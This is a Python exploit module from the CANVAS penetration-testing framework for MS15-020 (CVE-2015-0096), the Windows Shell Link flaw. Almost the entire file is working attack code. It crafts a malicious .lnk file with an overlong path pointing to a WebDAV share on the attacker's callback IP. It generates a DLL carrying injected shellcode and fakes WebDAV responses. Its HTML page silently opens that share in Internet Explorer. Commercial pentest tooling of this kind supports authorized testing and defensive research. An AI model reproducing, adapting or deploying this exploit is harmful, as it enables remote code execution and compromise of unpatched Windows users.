#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from random import randint
from random import choice
from string import ascii_uppercase
from string import ascii_lowercase
from string import digits
from struct import pack

from exploitutils import *
from tcpexploit import *
from httpclientside import *
from libs.spkproxy import header, body
from urlparse import urlparse

from MOSDEF.pelib import PElib
import canvasengine


NAME                            = "lnk_exec"
DESCRIPTION                     = "MS15-020 - Windows Shell Link Vulnerability"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION['Date public']    = '03/11/2015'
DOCUMENTATION['CVE Name']       = 'CVE-2015-0096'
DOCUMENTATION['CVE Url']        = 'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0096'
DOCUMENTATION['CVSS']           = 9.3
DOCUMENTATION['References']     = 'https://technet.microsoft.com/library/security/ms15-020'

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['7']

DOCUMENTATION["NOTES"]          = """
Tested on:
- Windows 7 (32bit)
 - Internet Explorer 8  (a popup will appear if Protected Mode is enabled)
 - Internet Explorer 9
 - Internet Explorer 10 (a popup will appear if Protected Mode is enabled)
 - Internet Explorer 11 (a popup will appear if Protected Mode is enabled)

Use port 80 as the server port (Windows requirement related to WebDAV). Also, under
the Response tab of ClientD main window, the option "Respond directly with exploit"
must be selected.

NOTE: To trigger the exploit the content icon of the WebDAV folder must be redrawn.
If for some reasons Explorer (launched by IE) is in background, it will fail to trigger.
"""

CHANGELOG = """
"""

targets = {
    0 : ["N/A", None, 0],
    1 : ["Windows", "en-us", 0],
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setInfo(DESCRIPTION)

        self.version = 0
        self.name = NAME

        self.is_running = False

        # Pick a random names
        #self.share_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6))
        self.share_name = 'shared'
        self.link_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".lnk"
        self.dll_name = ''.join(choice(ascii_lowercase + digits) for x in xrange(6)) + ".dll"

        self.refresh_rate = 0
        self.handles_options = True

        return

    def run(self):
        if not self.registerWebDavDirectory(self.share_name):
            self.log_info("Bailing")
            return False

        self.unc_path = "\\\\" + str(self.callback.ip) + "\\"
        if self.share_name != "":
            self.unc_path += self.share_name + "\\"

        self.is_running = True

        return True

    def createShellcode(self):
        class ShellcodeHelper(shellcodeGenerator.win32):
            """
            Derives from our previous one, but has our cleanup code in it.
            """
            def __init__(self):
                shellcodeGenerator.win32.__init__(self)
                self.handlers["lnk_cleanup"] = self.lnk_cleanup
                self.vProtectSelf = False

            def lnk_cleanup(self, args):
                self.code += """
                    movl $0xff0, %ebx
                    movl %fs:4(%ebx), %esp
                    popad
                    xorl %eax, %eax
                    ret
                """

        payload = self.createWin32ClientSideShellcode()

        # Here we use a shellcode with a custom exit stub
        sc = ShellcodeHelper()
        sc.vProtectSelf = True
        sc.addAttr("findeipnoesp", {"subespval": 0x1000})
        sc.addAttr("InjectToSelf", { "injectme" : payload, "DONTEXIT" : True})
        sc.addAttr("lnk_cleanup", None)

        mutex = mosdef.assemble("""
        pushad
        movl $0xff0, %ebx
        movl %fs:0(%ebx), %eax
        test %eax, %eax
        jz lnk_payload

        lnk_exit:
        popad
        xorl %eax, %eax
        ret

        lnk_payload:
        // if reason == 1 then do payload
        // we use 40 because we have 32 bytes from the pushad and 8(%esp)
        // is the second arg
        movl 40(%esp), %eax
        cmpl $1, %eax
        jnz lnk_exit

        // Set the mutex to 1
        movl $1, %fs:0(%ebx)
        movl %esp, %fs:4(%ebx)
        """, "x86")

        self.shellcode = mutex + sc.get()

        if len(self.shellcode) % 4:
            self.shellcode += "\x90" * (4 - (len(self.shellcode) % 4))

        self.log_debug("LNK - Length of shellcode: %s"%len(self.shellcode))

        return self.shellcode

    def create_dll_file(self, dll_name, win64=0):
        pelib = PElib(win64)

        # Create the dll in memory
        shellcode = self.createShellcode()
        buffer = pelib.createPEFileBuf({"DllMain" : shellcode}, gui=False)

        return buffer

    def create_link_file(self, filename, dll_path):
        ShellLinkHeader = ""
        ShellLinkHeader += struct.pack("<I", 0x4C) #HeaderSize
        ShellLinkHeader += struct.pack("<IIII", 0x21401, 0x00, 0xC0, 0x46000000) #LinkCLSID
        ShellLinkHeader += struct.pack("<I", 0x81) #LinkFlags
        ShellLinkHeader += struct.pack("<I", 0x00) #FileAttributes
        ShellLinkHeader += struct.pack("<Q", 0x00) #CreationTime
        ShellLinkHeader += struct.pack("<Q", 0x00) #AccessTime
        ShellLinkHeader += struct.pack("<Q", 0x00) #WriteTime
        ShellLinkHeader += struct.pack("<I", 0x00) #FileSize
        ShellLinkHeader += struct.pack("<I", 0x00) #IconIndex   ###############
        ShellLinkHeader += struct.pack("<I", 0x00) #ShowCommand
        ShellLinkHeader += struct.pack("<H", 0x00) #HotKey
        ShellLinkHeader += struct.pack("<H", 0x00) #Reserved1
        ShellLinkHeader += struct.pack("<I", 0x00) #Reserved2
        ShellLinkHeader += struct.pack("<I", 0x00) #Reserved3


        ItemID_0 = ""
        ItemID_0 += struct.pack("<H", 0x14) #ItemIDSize
        ItemID_0 += struct.pack("<B", 0x1F) #Type
        ItemID_0 += struct.pack("<B", 0x00) #Unknown
        ItemID_0 += struct.pack("<IIII", 0x20D04FE0, 0x10693AEA, 0x08D8A2, 0x9D30302B) #GUID

        ItemID_1 = ""
        ItemID_1 += struct.pack("<H", 0x14) #ItemIDSize
        ItemID_1 += struct.pack("<B", 0x2E) #Type
        ItemID_1 += struct.pack("<B", 0x1E) #Unknown
        ItemID_1 += struct.pack("<IIII", 0x21EC2020, 0x10693AEA, 0x08DDA2, 0x9D30302B) #GUID

        ItemID_2 = ""
        #ItemID_2 += struct.pack("<H", 0x) #ItemIDSize
        ItemID_2 += struct.pack("<H", 0x00) #Unknown
        ItemID_2 += struct.pack("<I", 0x00) #iconID
        ItemID_2 += struct.pack("<H", 0x00) #offsetToStr1
        ItemID_2 += struct.pack("<H", 0x00) #offsetToStr2
        ItemID_2 += struct.pack("<I", 0x00006A00) #moduleName (equal to this to activate Unicode)
        ItemID_2 += struct.pack("<H", 0x00) #Unknown
        ItemID_2 += struct.pack("<H", 0x00) #WoWFlags
        ItemID_2 += struct.pack("<H", 0x00) #offsetToUnicodeStr1
        ItemID_2 += struct.pack("<H", 0x00) #offsetToUnicodeStr2

        #########
        path = self.unc_path + dll_path + " "
        path += "A" * (257 - len(path) - len(".txt")) + ".txt"
        assert len(path)==257
        #########

        ItemID_2 += path.encode("utf-16")[2:] + struct.pack("<H", 0x00) #moduleNameUnicode
        ItemID_2 = struct.pack("<H", len(ItemID_2)+2) + ItemID_2

        LinkTargetIDList = ""
        LinkTargetIDList +=	struct.pack("<H", len(ItemID_0 + ItemID_1 + ItemID_2) + 2) #IDListSize
        LinkTargetIDList += ItemID_0
        LinkTargetIDList += ItemID_1
        LinkTargetIDList += ItemID_2
        LinkTargetIDList += struct.pack("<H", 0x00) #TerminalID

        ExtraData = ""
        ExtraData += struct.pack("<I", 0x00) #TerminalBlock

        return ShellLinkHeader + LinkTargetIDList + ExtraData

    def makesploit(self, clientheader, clientbody):
        if self.is_running == False:
            if self.run() == False:
                return None, None

        if clientheader.verb == "OPTIONS":
            h, b = self.do_options(clientheader, clientbody)
        elif clientheader.verb == "PROPFIND":
            h, b = self.do_propfind(clientheader, clientbody)
        elif clientheader.verb in ["GET","POST"]:
            h, b = self.do_get(clientheader, clientbody)
        else:
            self.log_error("Invalid request method (%s)" % clientheader.verb)
            h = header("SERVER")
            b = body()
            h.status = "404"
            h.msg = "Not Found"
            h.addHeader("Content-Type", "text/html")
            b.setBody("")

        return h, b

    def do_get(self, clientheader, clientbody):
        self.log_debug("LNK - Serving GET request (%s)" %clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".dll"):
            self.log_debug("LNK - Serving DLL Payload (%s)" % clientheader.URL)
            content = self.create_dll_file(self.dll_name)
            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        elif clientheader.URL.endswith(".lnk"):
            self.log_debug("LNK - Serving LNK File (%s)" % clientheader.URL)
            content = self.create_link_file(self.link_name, self.dll_name)
            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        elif clientheader.URL.endswith(".txt"):
            content = ""
            b.setBody(content)
            h.addHeader("Content-Type","application/octet-stream")
        else:
            self.log_debug("LNK - Redirecting to UNC (%s)" % self.unc_path)

            h.addHeader("Content-Type","text/html")

            # Redirect to \\<IP>\<SHARE_NAME>\
            html_body = '''<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
<script> function openWebDav(obj, url) {obj.navigateFrame(url, "_blank");}
</script>
</head>
<body onload="openWebDav(document.getElementById('spanWebDav'), 'http:%s');">
<div>
<span ID=spanWebDav style="behavior:url('#default#httpFolder');"></span>
</div>
</body>
</html>
'''%(self.unc_path.replace("\\", "/"))
            b.setBody(html_body)

        return h, b

    def do_options(self, clientheader, clientbody):
        self.log_debug("LNK - Serving OPTIONS request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        h.addHeader("Content-Type", "text/xml")
        h.addHeader("DAV", "1, 2")
        h.addHeader("Public", "OPTIONS, GET, PROPFIND")
        h.addHeader("Allow", "OPTIONS, GET, PROPFIND")
        h.addHeader("Refresh", "")

        h.status = "207"
        h.msg = "Multi-Status"

        b.setBody("")

        return h, b

    def do_propfind(self, clientheader, clientbody):
        self.log_debug("LNK - Serving PROPFIND request (%s)" % clientheader.URL)

        h = header("SERVER")
        b = body()

        if clientheader.URL.endswith(".dll"):
            self.log_debug("LNK - Sending multi-status for %s" % clientheader.URL)
            requested_dll = urlparse(clientheader.URL).path.split("/")[-1]
            self.log_debug("LNK - Requested dll is %s" % requested_dll)

            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" %(clientheader.URL, requested_dll, randint(0x1F400, 0x11F400), randint(0x0, 0x100000000))

            # The default 207 (Multi-Status) response body is a text/xml or application/xml
            # HTTP entity that contains a single XML element called multistatus. Multistatus
            # contains a set of XML elements called response that include 200, 300, 400, and 500
            # status codes generated during the method invocation
            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type", "text/xml")
            b.setBody(content_body)

            return h, b

        if clientheader.URL.endswith(".lnk"):
            self.log_debug("LNK - Sending multi-status for %s" %clientheader.URL)
            requested_lnk = urlparse(clientheader.URL).path.split("/")[-1]
            self.log_debug("LNK - Requested link is %s" % requested_lnk)

            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" %(clientheader.URL, requested_lnk, randint(0x80, 0x180), randint(0x0, 0x100000000))

            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type","text/xml")
            b.setBody(content_body)

            return h, b

        if clientheader.URL.endswith(".txt"):
            self.log_debug("LNK - Sending multi-status for %s" %clientheader.URL)
            requested_txt = urlparse(clientheader.URL).path.split("/")[-1]
            self.log_debug("LNK - Requested txt is %s" % requested_txt)

            content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>text</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>""" %(clientheader.URL, requested_txt, randint(0x80, 0x180), randint(0x0, 0x100000000))

            h.status = "207"
            h.msg = "Multi-Status"
            h.addHeader("Content-Type","text/xml")
            b.setBody(content_body)

            return h, b

        if not clientheader.URL.endswith("/"):
            if clientheader.URL.count(".") != 0:
                self.log_debug("LNK - Sending 404 for %s" % clientheader.URL)

                h.status = "404"
                h.msg = "Not Found"
                h.addHeader("Content-Type","text/html")
                b.setBody("")

                return h, b

        self.log_debug("LNK - Trying to serve content list %s" %(clientheader.URL))

        content_body = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
""" % (clientheader.URL, randint(0x0, 0x100000000))

        files = """
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s/%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>

""" %(clientheader.URL, self.dll_name, randint(0x1F400,0x11F400), randint(0x0, 0x100000000))

        files += """<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>%s/%s</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>%u</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"%.16x"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
""" %(clientheader.URL, self.link_name, randint(0x80, 0x180), randint(0x0, 0x100000000))

        if int(clientheader.getHeaderValue("Depth")) > 0:
            self.log_debug("LNK - Depth > 0")
            content_body += files

        content_body += "</D:multistatus>"

        h.status = "207"
        h.msg = "Multi-Status"
        h.addHeader("Content-Type",'text/xml; charset="utf8"')
        b.setBody(content_body)

        return h, b

    def is_vulnerable(self, info_dict):
        self.log_debug("LNK - is_vulnerable()")

        server_port = self.getServerPort()
        if server_port != 80:
            self.log_error("The %s exploit needs to be run with port 80 as the server port! Currently this is: %s." % (self.name, server_port))
            self.log_error("Otherwise WebDAV does not work.")
            return 0

        # No easy way to test if the target is vulnerable, the most reasonable thing to do
        # is to check if it is a windows host. Since the bug is 100% reliable, this is ok.
        if "Windows" in info_dict["user_agent"] or "MSIE" in info_dict["user_agent"] or "Microsoft" in info_dict["user_agent"]:
            self.log_error("Found vulnerable target")
            return 1

        self.log_debug("LNK - User Agent: %s" % info_dict.get("user_agent"))

        return 0


# For running the exploit on the command line
if __name__ == "__main__":
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
